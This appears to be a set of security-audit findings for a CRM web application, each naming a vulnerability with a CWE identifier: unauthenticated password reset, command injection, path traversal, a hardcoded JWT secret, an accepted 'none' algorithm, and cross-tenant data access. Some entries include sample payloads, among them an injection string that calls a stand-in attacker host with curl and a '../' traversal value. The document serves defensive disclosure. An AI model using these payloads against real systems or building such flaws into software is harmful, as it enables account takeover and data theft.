extra.message: confirmResetByEmailFallback() lets any caller reset a password knowing only the victim's email address. The route POST /api/auth/reset-password/email-fallback (auth.controller.ts:61-65) is marked @Public() and never validates a password-reset token or its expiry; it looks the user up by email and immediately overwrites passwordHash. An unauthenticated attacker can take over ANY account, including platform admins (e.g. admin@crm.com), by submitting a new password for the target email.

cwe: CWE-306: Missing Authentication for Critical Function

extra.message: User-controlled 'exportFormat' (from the request body of POST /api/documents/:id/convert, documents.controller.ts:119-126, reachable by any authenticated user) is concatenated directly into a shell command string: `soffice --headless --convert-to ${exportFormat} ...` which is then executed via child_process.exec() with a shell. An attacker can inject arbitrary OS commands (e.g. exportFormat = 'txt; curl attacker/$(id) #'), resulting in remote code execution on the server.

cwe: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

extra.message: In archiveEngagementPacket(), the user-supplied 'packetLabel' (POST /api/escalations/:id/packet, escalations.controller.ts:112-121) is concatenated into path.join(packetDir, `${packetLabel}.json`) with no sanitization, unlike the equivalent deals.archiveRenewalBrief which applies path.basename(). A value such as '../../../config/settings' writes attacker-controlled JSON content to an arbitrary location on disk. Since 'payload' is also fully attacker controlled, this is an arbitrary JSON file write via path traversal.

cwe: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

extra.message: In uploadLogo(), the uploaded file's originalname is used verbatim in path.join(publicLogosDir, file.originalname) and written with fs.writeFileSync. Multer's file.originalname is client-controlled and may contain ../ sequences, so an attacker with the PLATFORM_ADMIN/ACCOUNT_MANAGER role can write files (logoUrl is also set to `/public/logos/${file.originalname}`) outside the intended directory, potentially overwriting arbitrary files on the host. No MIME/type or content validation is applied either.

cwe: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

extra.message: The JWT signing/verification secret falls back to the well-known hardcoded value 'crm-jwt-secret-key-change-in-production' when the JWT_SECRET environment variable is unset (no .env is shipped, so this default is active). Anyone who knows this public default can forge a valid JWT (arbitrary sub/email/role) accepted by the app-wide JwtAuthGuard, defeating authentication. The identical default is reused for preview links, delivery receipts, rotation bundles and legacy-export crypto in documents.service.ts (206, 215, 241), webhooks.service.ts (173, 188, 216) and organizations.service.ts (301).

cwe: CWE-321: Use of Hard-coded Cryptographic Key

extra.message: processAllocation() verifies the partner 'x-access-token' with jwt.verify(..., { algorithms: ['HS256','none'] }). Because the 'none' algorithm is explicitly enabled and the endpoint is @Public (organizations.controller.ts:91-99), an attacker can present an unsigned token with header {"alg":"none"} and arbitrary claims ({sub, role}) and pass signature verification, gaining unauthenticated access to per-organization cost-allocation (annual-revenue-derived) data for any organization id.

cwe: CWE-347: Improper Verification of Cryptographic Signature
CWE-345: Insufficient Verification of Data Authenticity

extra.message: runSavedSegment() builds the filter as { ...roleWhere, ...criteria }, so arbitrary caller-supplied criteria (POST /api/contacts/segments/run, contacts.controller.ts:124-130, no @Roles restriction) are spread AFTER the role-scoped clause. A CUSTOMER_CONTACT (whose roleWhere pins organizationId to their own org) can override the tenant isolation by passing "organizationId": "<victim-org-id>" in criteria and retrieve up to 50 PII records (names/emails/phones) of contacts belonging to any other organization. Compare deals.runSavedSegment, which forces the org filter after merging and is safe.

cwe: CWE-639: Authorization Bypass Through User-Controlled Key

extra.message: adjustSharingScope() short-circuits to update when sharingMode === 'partner_shared' BEFORE calling checkModifyPermission(). The route PUT /api/contacts/:id/sharing-scope (contacts.controller.ts:89-96) has no @Roles decorator, so any authenticated user (including a CUSTOMER_CONTACT or SUPPORT_AGENT, who are normally forbidden from modifying contacts) can flip the sharing scope of contacts belonging to other organizations without any ownership check, bypassing object-level authorization.

The GET /api/audit-logs/external/:targetId handler combines @Public() with an empty @Roles(), which overrides the class-level @Roles(PLATFORM_ADMIN) and allows the request through with no role/identity enforcement. serveAuditRecord() (audit-logs.service.ts:119-143) only checks that the JWT is signed with JWT_SECRET (HS256) — the same key used to sign ordinary user sessions — and never checks that the caller is a platform admin. Consequently any authenticated user can present their own access token and read the full audit-log history (actions, actor emails, IPs, metadata) for any targetId.

previewCustomSegmentMessage() compiles an attacker-supplied 'messageTemplate' body value with Handlebars.compile() and renders it server-side (POST /api/notifications/segment-message/preview, notifications.controller.ts:77-84). Compiling untrusted templates server-side is a Server-Side Template Injection sink (CWE-1336): depending on the Handlebars version/helpers available this can be escalated to prototype pollution or code execution, and at minimum allows crafted templates to render arbitrary expressions against server data.

cwe: CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine

extra.message: recordActivityNote() (POST /api/activity-notes, comments.controller.ts:9-18, no @Roles and no target existence/ownership check) lets any authenticated user, including CUSTOMER_CONTACT, write a comment onto an arbitrary targetType/targetId (e.g. another org's escalation) and, crucially, set isInternal: true themselves. The escalation-scoped path (escalations.service.addComment) explicitly forbids non-staff from creating internal comments and enforces org access; this generic endpoint bypasses both checks, allowing cross-tenant tampering/injection of internal notes.

findAll()/findOne() return the full Webhook entity including the 'secret' signing field (webhook.entity.ts:23-24) with no organization-ownership scoping: an ACCOUNT_MANAGER can pass any organizationId (GET /api/webhooks?organizationId=...) or any webhook id and retrieve the signing secret of webhooks belonging to organizations they do not manage. There is no check that the caller owns the org, so webhook secrets are disclosed horizontally across tenants.

cwe: CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

extra.message: forgotPassword() logs the newly generated password-reset token to the console (`[PASSWORD RESET] Token for <email>: <token>`). Anyone with access to application logs (shared CI consoles, log aggregators) can intercept a live one-time password-reset token and use it to reset the victim's password. Tokens should only be delivered to the account holder's out-of-band channel.

cwe: CWE-532: Insertion of Sensitive Information into Log File

extra.message: Database credentials default to the well-known values crm_user / crm_password when DB_USERNAME/DB_PASSWORD are not set. Combined with ssl disabled by default (line 18), a default deployment connects to Postgres with predictable credentials and unencrypted transport.

register() (public endpoint POST /api/auth/register) returns a distinct ConflictException 'A user with this email already exists' when the email is already registered. An unauthenticated attacker can enumerate which email addresses have accounts on the platform (account enumeration), enabling targeted phishing or credential-stuffing attacks.
